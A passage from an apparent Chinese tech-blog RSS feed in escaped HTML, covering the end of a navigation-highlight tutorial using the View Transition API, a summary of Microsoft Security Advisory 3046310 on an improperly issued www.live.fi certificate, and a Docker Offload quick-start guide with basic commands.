&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;relativePosX&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;itemPos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;left&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;navbarPos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;styles&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;relativePosX&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;px`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;px`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;assign&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;highlighterElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;styles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;使用view-transition-api&#34;&gt;使用View Transition API
&lt;/h2&gt;&lt;p&gt;View Transition API提供了在网站视图之间创建动画过渡的功能。对于这种方法，我们不再需要单独的#highlight元素，而是可以直接使用伪选择器设置.active导航项的样式，并让View Transition API处理新导航项被点击时前后UI状态之间的动画。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;navbar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;addEventListener&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;click&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;matches&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nav a:not(.active)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;startViewTransition&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nav a.active&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;classList&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;remove&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;active&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;classList&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;active&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;调整视图过渡&#34;&gt;调整视图过渡
&lt;/h2&gt;&lt;p&gt;为确保边框高度在整个过渡过程中保持一致，我们需要为表示旧视图和新视图静态快照的::view-transition-old和::view-transition-new伪选择器声明明确的高度。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nd&#34;&gt;view-transition-old&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;highlight&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nd&#34;&gt;view-transition-new&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;highlight&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;网站UI状态之间的动画和过渡曾经需要大量外部库以及冗长、混乱且容易出错的代码，但原生JavaScript和CSS已经包含了实现类似原生应用交互的功能。我们通过两种方法实现了&amp;quot;动态高亮&amp;quot;导航模式：结合CSS过渡和getBoundingClientRect()方法，以及View Transition API。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>微软发布安全公告3046310：关于不当签发数字证书导致身份伪造的风险</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E5%8F%91%E5%B8%83%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A3046310%E5%85%B3%E4%BA%8E%E4%B8%8D%E5%BD%93%E7%AD%BE%E5%8F%91%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E5%AF%BC%E8%87%B4%E8%BA%AB%E4%BB%BD%E4%BC%AA%E9%80%A0%E7%9A%84%E9%A3%8E%E9%99%A9/</link>
        <pubDate>Mon, 04 Aug 2025 06:25:06 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E5%8F%91%E5%B8%83%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A3046310%E5%85%B3%E4%BA%8E%E4%B8%8D%E5%BD%93%E7%AD%BE%E5%8F%91%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E5%AF%BC%E8%87%B4%E8%BA%AB%E4%BB%BD%E4%BC%AA%E9%80%A0%E7%9A%84%E9%A3%8E%E9%99%A9/</guid>
        <description>&lt;p&gt;2015年3月17日，微软发布了安全公告3046310「不适当签发的数字证书可能导致身份伪造」。该公告指出，数字证书用于验证网站的真实性，但不当签发的证书可能被用于身份伪造、钓鱼或中间人攻击。微软已与证书颁发机构合作，更新了证书信任列表（CTL），以消除对不当签发证书的信任。&lt;/p&gt;
&lt;h3 id=&#34;受影响证书详情&#34;&gt;受影响证书详情
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;证书&lt;/th&gt;
          &lt;th&gt;颁发者&lt;/th&gt;
          &lt;th&gt;指纹&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.live.fi&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.live.fi&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;COMODO RSA Domain Validation Secure Serve CA&lt;/td&gt;
          &lt;td&gt;08 e4 98 72 49 bc 45 07 48 a4 a7 81 33 cb f0 41 a3 51 00 33&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;微软目前尚未发现与此问题相关的攻击活动。&lt;/p&gt;
&lt;h3 id=&#34;推荐措施&#34;&gt;推荐措施
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Windows 8/8.1/RT/RT 8.1/Server 2012/Server 2012 R2用户&lt;/strong&gt;：系统已默认启用证书自动更新工具，无需额外操作。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Windows Vista/7/Server 2008/Server 2008 R2用户&lt;/strong&gt;：若已使用自动更新工具（KB2677070），系统将自动保护；否则需手动配置离线环境（KB2813430）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Windows Server 2003用户&lt;/strong&gt;：相关更新已于3月19日（美国时间）发布。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;相关资源&#34;&gt;相关资源
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blogs.msdn.microsoft.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;证书更新功能的演进与Windows XP支持终止后的风险&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blogs.msdn.microsoft.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;微软可信证书基础设施：根证书更新程序与工具&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://support.microsoft.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;安全公告2854544（KB2813430）：根证书更新程序的管理增强&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更多详情请参阅&lt;a class=&#34;link&#34; href=&#34;https://support.microsoft.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;安全公告3046310&lt;/a&gt;。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Docker Offload：AI工作负载的最佳特性之一</title>
        <link>http://localhost:1313/p/docker-offloadai%E5%B7%A5%E4%BD%9C%E8%B4%9F%E8%BD%BD%E7%9A%84%E6%9C%80%E4%BD%B3%E7%89%B9%E6%80%A7%E4%B9%8B%E4%B8%80/</link>
        <pubDate>Mon, 04 Aug 2025 06:03:43 +0800</pubDate>
        
        <guid>http://localhost:1313/p/docker-offloadai%E5%B7%A5%E4%BD%9C%E8%B4%9F%E8%BD%BD%E7%9A%84%E6%9C%80%E4%BD%B3%E7%89%B9%E6%80%A7%E4%B9%8B%E4%B8%80/</guid>
        <description>&lt;h1 id=&#34;docker-offloadai工作负载的最佳特性之一&#34;&gt;Docker Offload：AI工作负载的最佳特性之一
&lt;/h1&gt;&lt;p&gt;Docker Offload 是一项全托管服务，允许用户在云基础设施上执行Docker构建和运行容器，同时保持本地开发体验。&lt;/p&gt;
&lt;h2 id=&#34;什么是docker-offload&#34;&gt;什么是Docker Offload？
&lt;/h2&gt;&lt;p&gt;如果你曾因本地机器缺乏GPU或计算资源而无法运行AI模型或数据处理管道，Docker Offload正是为此设计的解决方案。它通过安全SSH隧道将本地Docker命令转发至云端的Docker守护进程，所有容器构建和工作负载均在云端执行，而用户仍使用熟悉的本地命令。&lt;/p&gt;
&lt;h2 id=&#34;为什么使用docker-offload&#34;&gt;为什么使用Docker Offload？
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;资源扩展&lt;/strong&gt;：运行计算密集型容器，突破本地硬件限制。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;云构建加速&lt;/strong&gt;：将重型构建任务卸载到云端。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;无缝开发体验&lt;/strong&gt;：保留本地开发流程，无需手动配置云环境。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;即时GPU支持&lt;/strong&gt;：直接访问云端GPU资源（如NVIDIA L4）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;受限环境适配&lt;/strong&gt;：在虚拟桌面（VDI）等受限环境中高效开发。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;快速入门指南&#34;&gt;快速入门指南
&lt;/h2&gt;&lt;h3 id=&#34;前提条件&#34;&gt;前提条件
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Docker Desktop 4.43.0或更高版本。&lt;/li&gt;
&lt;li&gt;已注册Docker Offload Beta访问权限（&lt;a class=&#34;link&#34; href=&#34;https://www.docker.com/products/docker-offload/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;申请链接&lt;/a&gt;）。&lt;/li&gt;
&lt;li&gt;无限制性代理或防火墙阻挡Docker Cloud流量。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;启用docker-offload&#34;&gt;启用Docker Offload
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;通过Docker Desktop&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在界面顶部切换“Docker Offload”按钮。&lt;/li&gt;
&lt;li&gt;Docker Desktop颜色变为紫色，并显示云图标，表示已连接至云端环境。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;通过终端&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;docker&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offload&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;start
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;按提示选择账户和是否需要GPU支持。完成后，终端会显示“New Docker context created: docker-cloud”。&lt;/p&gt;
&lt;h3 id=&#34;运行容器与构建示例&#34;&gt;运行容器与构建示例
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;状态检查&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;docker&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offload&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;status&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;构建容器&lt;/strong&gt;（以&lt;a class=&#34;link&#34; href=&#34;https://github.com/sunnynagavo/docker-offload-demo.git&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Ajeet Raina的示例库&lt;/a&gt;为例）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;git&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;clone&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;github&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sunnynagavo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;docker-offload&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-demo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;git&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd docker-offload&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-demo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;docker&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;build&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-t&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;docker-offload&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-demo&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;日志将显示构建在云端执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;启动GPU容器&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;docker&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;run&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-rm&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-gpus&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;all&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3000&lt;/span&gt;&lt;span 